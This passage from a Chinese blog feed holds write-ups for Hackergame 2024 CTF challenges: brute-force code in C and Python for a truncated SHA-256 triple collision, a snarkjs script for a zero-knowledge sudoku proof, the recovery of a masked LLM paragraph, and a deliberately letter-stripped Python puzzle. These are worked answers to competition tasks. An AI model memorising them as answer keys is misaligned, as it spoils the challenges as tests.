class="token class-name">size_t</span> len<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>hex_output<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>hex_output <span class="token operator">+</span> i <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"%02x"</span><span class="token punctuation">,</span> bytes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token string">"89629d7e0868d3d9"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> ans<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">strncpy</span><span class="token punctuation">(</span>ans<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> a_bytes<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">sscanf</span><span class="token punctuation">(</span>a <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> i<span class="token punctuation">,</span> <span class="token string">"%2hhx"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>a_bytes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> h<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> hash<span class="token punctuation">[</span>SHA256_DIGEST_LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">SHA256</span><span class="token punctuation">(</span>a_bytes<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> hash<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span> hash <span class="token operator">+</span> SHA256_DIGEST_LENGTH <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> found <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> attempts <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>found <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 生成8字节的随机数</span>        <span class="token keyword">unsigned</span> <span class="token keyword">char</span> b<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">char</span> b_hash<span class="token punctuation">[</span>SHA256_DIGEST_LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">SHA256</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> b_hash<span class="token punctuation">)</span><span class="token punctuation">;</span>        attempts<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>b_hash <span class="token operator">+</span> SHA256_DIGEST_LENGTH <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">,</span> h<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">bytes_to_hex</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> ans<span class="token punctuation">[</span>found<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Found match: %s\n"</span><span class="token punctuation">,</span> ans<span class="token punctuation">[</span>found<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            found<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>attempts <span class="token operator">%</span> <span class="token number">1000000</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Total found: %d, Attempts so far: %llu\n"</span><span class="token punctuation">,</span> found<span class="token punctuation">,</span> attempts<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实测大约跑了90亿次以后，程序碰出了两个值：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/101d6739-c85b-413f-81a8-1175afd0f35a.png" alt="image-20241109195444240" style="zoom:50%;" /></p><hr><p>赛后看<a href="https://mcfx.us/posts/2024-11-09-hackergame-2024-writeup/#%E4%B8%89%E7%A2%B0%E6%92%9E%E4%B9%8B%E4%B8%80">mcfx的题解</a>，才发现我之前考虑过的方法其实是work的：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256<span class="token keyword">from</span> collections <span class="token keyword">import</span> defaultdict<span class="token keyword">import</span> osd <span class="token operator">=</span> defaultdict<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    h <span class="token operator">=</span> sha256<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    d<span class="token punctuation">[</span>h<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span>h<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> v <span class="token keyword">in</span> d<span class="token punctuation">[</span>h<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但我当时错误的估计了碰撞难度，以为这样会把字典撑爆，故没有实施。后来试了一下发现这方法贼快，而我写C语言强行碰撞90亿次的行为则像个大冤种。</p><h2 id="零知识数独"><a href="#零知识数独" class="headerlink" title="零知识数独"></a>零知识数独</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>一款全新的零知识数独！你已然是数独高手，也终将成为零知识证明大师！</p><blockquote><p>“If the proof is correct, then no other recognition is needed.”</p><p><cite>— by Grigori Perelman</cite></p></blockquote><p><strong>ZK 验证逻辑</strong></p><p>本题的附件中给出了零知识数独电路，以及对应的 Groth16 验证密钥，服务端会使用它保存的谜题（Public Signals）和验证密钥（Verification Key）来验证提交的 Groth16 证明 <code>proof.json</code>。你的证明在本地需要满足：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ snarkjs groth16 verify verification_key.json public.json proof.json<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span>  snarkJS: OK<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><a href="https://github.com/USTC-Hackergame/hackergame2024-writeups/blob/master/official/%E9%9B%B6%E7%9F%A5%E8%AF%86%E6%95%B0%E7%8B%AC/files/zksudoku.zip">本题附件</a></p></div></div></details><p>零知识证明？这个名词虽然听过，但也算是没接触过的东西，成功把我唬住了，没想到前两问就是送分。</p><h3 id="数独高手"><a href="#数独高手" class="headerlink" title="数独高手"></a>数独高手</h3><p>手玩所有难度即可拿flag。也可以借助<a href="http://zh.sudoku.menu/info/solver.html">这个网站</a></p><h3 id="ZK-高手"><a href="#ZK-高手" class="headerlink" title="ZK 高手"></a>ZK 高手</h3><p>基本也是解出数独就行，不过需要打包成所谓的零知识证明的什么格式。</p><p>打包代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> snarkjs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"snarkjs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> input <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token string-property property">"unsolved_grid"</span><span class="token operator">:</span> <span class="token punctuation">[</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string-property property">"solved_grid"</span><span class="token operator">:</span> <span class="token punctuation">[</span>  <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">convertNumbersToStrings</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> arr<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">row</span> <span class="token operator">=></span> row<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">num</span> <span class="token operator">=></span> num<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>input<span class="token punctuation">.</span>unsolved_grid <span class="token operator">=</span> <span class="token function">convertNumbersToStrings</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span>unsolved_grid<span class="token punctuation">)</span><span class="token punctuation">;</span>input<span class="token punctuation">.</span>solved_grid <span class="token operator">=</span> <span class="token function">convertNumbersToStrings</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span>solved_grid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">generateProof</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> proof<span class="token punctuation">,</span> publicSignals <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">await</span> snarkjs<span class="token punctuation">.</span>groth16<span class="token punctuation">.</span><span class="token function">fullProve</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> <span class="token string">"attachment/sudoku.wasm"</span><span class="token punctuation">,</span> <span class="token string">"attachment/sudoku.zkey"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'proof.json'</span><span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>proof<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Proof written to proof.json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'public.json'</span><span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>publicSignals<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'public signals written to public.json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">generateProof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">err</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Error generating proof:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把数独题目和解写到最上面的<code>input</code>变量里即可。</p><h2 id="先104🤣」"><a href="#先104🤣」" class="headerlink" title="先104🤣」"></a>先104🤣」</h2><p>(原题目名：先不说关于我从零开始独自在异世界转生成某大厂家的 LLM 龙猫女仆这件事可不可能这么离谱，发现 Hackergame 内容审查委员会忘记审查题目标题了ごめんね，以及「这么长都快赶上轻小说了真的不会影响用户体验吗🤣」)</p><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><blockquote><p>以下内容包含 Human 辅助创作</p></blockquote><p>emmmmm 这次事件的背景大概如题所示。具体而言，在某位不幸群友转生成了 <a href="https://modelscope.cn/models/qwen/Qwen2.5-3B-Instruct-GGUF">Qwen 2.5-3B</a>（还是 8-bit 量化的）后，毫无人道主义关怀的出题人们使用各种超越碳基生物（以及硅基生物）想象力的提示词对其进行了花样繁多的调戏。为了表达自己的不满，这位可怜的 LLM 只好锲而不舍地输出一些关于 Hackergame 的胡话。幸好 Hackergame 内容审查委员会提前部署了分级的内容审查系统（详见题目附件），比如把和 hackergame 相关的字符全部屏蔽成 <code>&#39;x&#39;</code> 了：</p><hr><p>In txx xxxnd xxll of Hxxxxxxxxx 2024, wxxxx txx wxlls xxx linxd witx sxxxxns sxowinx txx lxtxst xxploits fxox txx xybxx woxld, xontxstxnts xxtxxxxd in x fxxnzy, txxix xyxs xluxd to txx vixtuxl xxploits. Txx xtxospxxxx wxs xlxxtxix, witx txx sxxll of fxxsxly bxxwxd xoffxx xinxlinx witx txx sxxnt of buxnt Etxxxnxt xxblxs. As txx fixst xxxllxnxx wxs xnnounxxd, x txxx of xxxxxxs, dxxssxd in lxb xoxts xnd xxxxyinx lxptops, spxintxd to txx nxxxxst sxxvxx xoox, txxix fxxxs x xix of xxxitxxxnt xnd dxtxxxinxtion. Txx xxxx wxs on, xnd txx stxxxs wxxx xixx, witx txx ultixxtx pxizx bxinx x xoldxn txopxy xnd txx bxxxxinx xixxts to sxy txxy wxxx txx bxst xt xxxxxinx xodxs xnd xxxxinx systxxs in txx lxnd of txx xisinx sun.</p><hr><p>嘛说实话这个审查系统似乎确凿是强了些（虽然它没审查题目标题），所以如果你一定想阅读原文的话估计得自己想办法了。</p></div></div></details><h3 id="「行吧就算标题可以很长但是-flag-一定要短点」"><a href="#「行吧就算标题可以很长但是-flag-一定要短点」" class="headerlink" title="「行吧就算标题可以很长但是 flag 一定要短点」"></a>「行吧就算标题可以很长但是 flag 一定要短点」</h3><p>大语言模型生成一段关于Hackergame 2024的段落，然后把其中的<code>hackergame</code>里的字母全替换成了<code>x</code>。</p><p>文本：</p><pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">In txx xxxnd xxll of Hxxxxxxxxx 2024, wxxxx txx wxlls xxx linxd witx sxxxxns sxowinx txx lxtxst xxploits fxox txx xybxx woxld, xontxstxnts xxtxxxxd in x fxxnzy, txxix xyxs xluxd to txx vixtuxl xxploits. Txx xtxospxxxx wxs xlxxtxix, witx txx sxxll of fxxsxly bxxwxd xoffxx xinxlinx witx txx sxxnt of buxnt Etxxxnxt xxblxs. As txx fixst xxxllxnxx wxs xnnounxxd, x txxx of xxxxxxs, dxxssxd in lxb xoxts xnd xxxxyinx lxptops, spxintxd to txx nxxxxst sxxvxx xoox, txxix fxxxs x xix of xxxitxxxnt xnd dxtxxxinxtion. Txx xxxx wxs on, xnd txx stxxxs wxxx xixx, witx txx ultixxtx pxizx bxinx x xoldxn txopxy xnd txx bxxxxinx xixxts to sxy txxy wxxx txx bxst xt xxxxxinx xodxs xnd xxxxinx systxxs in txx lxnd of txx xisinx sun.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当Wordle来做，<del>我是Wordle大师。</del></p><p>轻松推出原文：</p><pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">In the grand hall of Hackergame 2024, where the walls are lined with screens showing the latest exploits from the cyber world, contestants gathered in a frenzy, their eyes glued to the virtual exploits. The atmosphere was electric, with the smell of freshly brewed coffee mingling with the scent of burnt Ethernet cables. As the first challenge was announced, a team of hackers, dressed in lab coats and carrying laptops, sprinted to the nearest server room, their faces a mix of excitement and determination. The game was on, and the stakes were high, with the ultimate prize being a golden trophy and the bragging rights to say they were the best at cracking codes and hacking systems in the land of the rising sun.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二问想到了可能要去搜这个模型的词典，然后写深搜来做，不过其他题太有意思了，就没去实现这个想法。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;本文是Hackergame 2024 题解的第三部分。&lt;/p&gt;
&lt;h2 id=&quot;动画分享&quot;&gt;&lt;a href=&quot;#动画分享&quot; class=&quot;headerlink&quot; title=&quot;动画分享&quot;&gt;&lt;/a&gt;动画分享&lt;/h2&gt;&lt;details class=&quot;toggle&quot;</summary>
        
      
    
    
    
    <category term="CTF题解" scheme="https://blog.fyz666.xyz/categories/ctf%E9%A2%98%E8%A7%A3/"/>
    
    
    <category term="Hackergame" scheme="https://blog.fyz666.xyz/tags/hackergame/"/>
    
    <category term="Hackergame 2024" scheme="https://blog.fyz666.xyz/tags/hackergame-2024/"/>
    
  </entry>
  
  <entry>
    <title>Hackergame 2024 题解（二）</title>
    <link href="https://blog.fyz666.xyz/blog/12168/"/>
    <id>https://blog.fyz666.xyz/blog/12168/</id>
    <published>2024-11-09T05:10:26.000Z</published>
    <updated>2025-08-14T08:53:41.567Z</updated>
    
    <content type="html"><![CDATA[<p>本文是Hackergame 2024 题解的第二部分。</p><h2 id="惜字如金-3-0"><a href="#惜字如金-3-0" class="headerlink" title="惜字如金 3.0"></a>惜字如金 3.0</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>惜字如金一向是程序开发的优良传统。无论是「<a href="https://stackoverflow.com/questions/8390979/why-create-system-call-is-called-creat">creat</a>」还是「<a href="https://stackoverflow.com/questions/8226075/why-http-referer-is-single-r-not-http-referrer">referer</a>」，都无不闪耀着程序员「节约每句话中的每一个字母」的优秀品质。两年前，信息安全大赛组委会正式推出了「惜字如金化」（XZRJification）标准规范，受到了广大程序开发人员的热烈欢迎和一致好评。现将该标准重新辑录如下。</p><p><strong>惜字如金化标准</strong><br>惜字如金化指的是将一串文本中的部分字符删除，从而形成另一串文本的过程。该标准针对的是文本中所有由 52 个拉丁字母连续排布形成的序列，在下文中统称为「单词」。一个单词中除「<code>AEIOUaeiou</code>」外的 42 个字母被称作「辅音字母」。整个惜字如金化的过程按照以下两条原则对文本中的每个单词进行操作：</p><ul><li>第一原则（又称 creat 原则）：如单词最后一个字母为「<code>e</code>」或「<code>E</code>」，且该字母的上一个字母为辅音字母，则该字母予以删除。</li><li>第二原则（又称 referer 原则）：如单词中存在一串全部由完全相同（忽略大小写）的辅音字母组成的子串，则该子串仅保留第一个字母。</li></ul><p>容易证明惜字如金化操作是幂等的：多次惜字如金化和一次惜字如金化的结果是相同的。</p><p><strong>你的任务</strong><br>为了拿到对应的三个 flag，你需要将三个「惜字如金化」后的 Python 源代码文本文件补全。<strong>所有文本文件在「惜字如金化」前均使用空格将每行填充到了 80 个字符</strong>。后台会对上传的文本文件逐行匹配，如果每行均和「惜字如金化」前的文本文件完全相符，则输出对应 flag。上传文件<strong>无论使用 LF 还是 CRLF 换行，无论是否在尾部增加了单独的换行符，均对匹配结果没有影响。</strong></p><p><strong>附注</strong><br>本文已经过惜字如金化处理。解答本题（拿到 flag）不需要任何往届比赛的相关知识。</p><hr><p>XIZIRUJIN has always been a good tradition of programing. Whether it is “<a href="https://stackoverflow.com/questions/8390979/why-create-system-call-is-called-creat">creat</a>“ or “<a href="https://stackoverflow.com/questions/8226075/why-http-referer-is-single-r-not-http-referrer">referer</a>“, they al shin with th great virtu of a programer which saves every leter in every sentens. Th Hackergam Comitee launched th “XZRJification” standard about two years ago, which has been greatly welcomed and highly aclaimed by a wid rang of programers. Her w republish th standard as folows.</p><p><strong>XZRJification Standard</strong><br>XZRJification refers to th proces of deleting som characters in a text which forms another text. Th standard aims at al th continuous sequences of 52 Latin leters named as “word”s in a text. Th 42 leters in a word except “<code>AEIOUaeiou</code>“ ar caled “consonant”s. Th XZRJification proces operates on each word in th text acording to th folowing two principles:</p><ul><li>Th first principl (also known as creat principl): If th last leter of th word is “<code>e</code>“ or “<code>E</code>“, and th previous leter of this leter is a consonant, th leter wil b deleted.</li><li>Th second principl (also known as referer principl): If ther is a substring of th sam consonant (ignoring cas) in a word, only th first leter of th substring wil b reserved.<br>It is easy to prov that XZRJification is idempotent: th result of procesing XZRJification multipl times is exactly th sam as that of only onc.</li></ul><p><strong>Your Task</strong><br>In order to get th three flags, you need to complet three python sourc cod files procesed through XZRJification. <strong>Al th sourc cod files ar paded to 80 characters per lin with spaces befor XZRJification</strong>. Th server backend wil match th uploaded text files lin by lin, and output th flag if each lin matches th coresponding lin in th sourc cod fil befor XZRJification. <strong>Whether LF or CRLF is used, or whether an aditional lin break is aded at th end or not, ther wil b no efect on th matching results of uploaded files.</strong></p><p><strong>Notes</strong><br>This articl has been procesed through XZRJification. Any knowledg related to previous competitions is not required to get th answers (flags) of this chaleng.</p><p><a href="https://github.com/USTC-Hackergame/hackergame2024-writeups/tree/master/official/%E6%83%9C%E5%AD%97%E5%A6%82%E9%87%91%203.0/files">本题附件</a></p></div></div></details><p>三个题分别要求还原三个惜字如金化处理后的文件。</p><h3 id="题目-A"><a href="#题目-A" class="headerlink" title="题目 A"></a>题目 A</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3                                                              </span>                                                                                <span class="token keyword">import</span> atexit<span class="token punctuation">,</span> bas64<span class="token punctuation">,</span> flask<span class="token punctuation">,</span> itertools<span class="token punctuation">,</span> os<span class="token punctuation">,</span> r                                                                                                                                                                                                 <span class="token keyword">def</span> <span class="token function">crc</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>                                                       poly<span class="token punctuation">,</span> poly_degree <span class="token operator">=</span> <span class="token string">'AaaaaaAaaaAAaaaaAAAAaaaAAAaAaAAAAaAAAaaAaaAaaAaaA'</span><span class="token punctuation">,</span> <span class="token number">48</span>     asert <span class="token builtin">len</span><span class="token punctuation">(</span>poly<span class="token punctuation">)</span> <span class="token operator">==</span> poly_degree <span class="token operator">+</span> <span class="token number">1</span> <span class="token keyword">and</span> poly<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> poly<span class="token punctuation">[</span>poly_degree<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'A'</span>     flip <span class="token operator">=</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span>poly<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> rang<span class="token punctuation">(</span>poly_degree<span class="token punctuation">)</span><span class="token punctuation">)</span>      digest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> poly_degree<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>                                                 <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">input</span><span class="token punctuation">:</span>                                                                     digest <span class="token operator">=</span> digest <span class="token operator">^</span> b                                                             <span class="token keyword">for</span> _ <span class="token keyword">in</span> rang<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                                                  digest <span class="token operator">=</span> <span class="token punctuation">(</span>digest <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>flip <span class="token keyword">if</span> digest <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token number">1</span> els <span class="token number">0</span><span class="token punctuation">)</span>               <span class="token keyword">return</span> digest <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> poly_degree<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>                                                                                                                                                                                                      <span class="token keyword">def</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>                                                    digest <span class="token operator">=</span> crc<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span>                                                             u2<span class="token punctuation">,</span> 